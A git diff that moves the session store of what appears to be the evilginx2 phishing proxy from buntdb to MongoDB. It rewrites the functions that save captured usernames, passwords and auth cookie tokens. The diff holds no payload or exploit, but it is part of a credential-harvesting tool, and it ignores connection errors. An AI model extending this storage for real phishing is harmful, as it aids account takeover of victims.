@@ -1,15 +1,18 @@
 package database
 
 import (
+	"context"
 	"encoding/json"
 	"strconv"
+	"time"
 
-	"github.com/tidwall/buntdb"
+	"go.mongodb.org/mongo-driver/mongo"
+	"go.mongodb.org/mongo-driver/mongo/options"
 )
 
 type Database struct {
 	path string
-	db   *buntdb.DB
+	db   *mongo.Database
 }
 
 func NewDatabase(path string) (*Database, error) {
@@ -18,14 +21,12 @@ func NewDatabase(path string) (*Database, error) {
 		path: path,
 	}
 
-	d.db, err = buntdb.Open(path)
-	if err != nil {
-		return nil, err
-	}
+	ctx, _ := context.WithTimeout(context.Background(), 10*time.Second)
+	client, _ := mongo.Connect(ctx, options.Client().ApplyURI("mongodb://localhost:27017"))
+	d.db = client.Database("evilginx2")
 
 	d.sessionsInit()
 
-	d.db.Shrink()
 	return d, nil
 }
 
@@ -40,32 +41,62 @@ func (d *Database) ListSessions() ([]*Session, error) {
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	err := d.sessionsUpdateUsername(sid, username)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Username = username
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	err := d.sessionsUpdatePassword(sid, password)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Password = password
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
 func (d *Database) SetSessionCustom(sid string, name string, value string) error {
-	err := d.sessionsUpdateCustom(sid, name, value)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Custom[name] = value
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
 func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
-	err := d.sessionsUpdateBodyTokens(sid, tokens)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.BodyTokens = tokens
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
 func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
-	err := d.sessionsUpdateHttpTokens(sid, tokens)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.HttpTokens = tokens
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
 func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	err := d.sessionsUpdateCookieTokens(sid, tokens)
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.CookieTokens = tokens
+	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
 
@@ -88,46 +119,5 @@ func (d *Database) DeleteSessionById(id int) error {
 }
 
 func (d *Database) Flush() {
-	d.db.Shrink()
-}
-
-func (d *Database) genIndex(table_name string, id int) string {
-	return table_name + ":" + strconv.Itoa(id)
-}
-
-func (d *Database) getLastId(table_name string) (int, error) {
-	var id int = 1
-	var err error
-	err = d.db.View(func(tx *buntdb.Tx) error {
-		var s_id string
-		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
-			return err
-		}
-		if id, err = strconv.Atoi(s_id); err != nil {
-			return err
-		}
-		return nil
-	})
-	return id, err
-}
-
-func (d *Database) getNextId(table_name string) (int, error) {
-	var id int = 1
-	var err error
-	err = d.db.Update(func(tx *buntdb.Tx) error {
-		var s_id string
-		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
-			if id, err = strconv.Atoi(s_id); err != nil {
-				return err
-			}
-		}
-		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
-		return nil
-	})
-	return id, err
-}
-
-func (d *Database) getPivot(t interface{}) string {
-	pivot, _ := json.Marshal(t)
-	return string(pivot)
+	// No equivalent operation in MongoDB
 }
